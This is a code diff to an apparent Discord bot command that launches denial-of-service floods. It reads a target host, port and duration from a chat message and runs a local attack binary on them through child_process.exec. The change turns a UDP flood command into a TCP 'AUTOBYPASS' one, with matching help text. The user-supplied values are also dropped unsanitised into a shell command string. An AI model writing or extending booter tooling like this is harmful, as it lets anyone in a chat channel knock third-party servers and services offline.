@@ -7,7 +7,7 @@ exports.run = async (client, message, args) => {
 
 const host = message.content.split (" ")[1]
 const port = message.content.split (" ")[2]
-const pps = message.content.split (" ")[3]
+const time = message.content.split (" ")[3]
 const api = message.content.split (" ")[4]
 const ayarlar = require('../ayarlar.json');
 var room = ayarlar.commandroom;
@@ -33,7 +33,7 @@ if(!args[0]) {
 	const embed1 = new Discord.MessageEmbed()
 	.setColor('RANDOM')
 	.setTitle('WARRING')
-	.setDescription("`contoh ;UDP target time pps api`")
+	.setDescription("`contoh ;TCP target PORT TIME api`")
 	.setFooter("GUNAKAN DENGAN BIJAK OKH!!!")
 	message.channel.send(embed1);
 	return;
@@ -69,7 +69,7 @@ if(!args[0]) {
 
 // Command attack
 var exec = require('child_process').exec
-exec(`./ALLAH-NUKE ${host} 9000 ${pps} ${port}`, (error, stdout, stderr) => {
+exec(`./AUTOBYPASS TCP ${host} ${port} ${time}`, (error, stdout, stderr) => {
 });
 
 // Start Attacking
@@ -114,12 +114,12 @@ const embed = new Discord.MessageEmbed()
 exports.conf = {
   enabled: true,
   guildOnly: false,
-  aliases: ['udp'],
+  aliases: ['TCP'],
   permLevel: 0
 }
 
 exports.help = {
-  name: 'udp',
+  name: 'TCP',
   description: 'YUKAI',
-  usage: 'udp'
+  usage: 'TCP'
 }
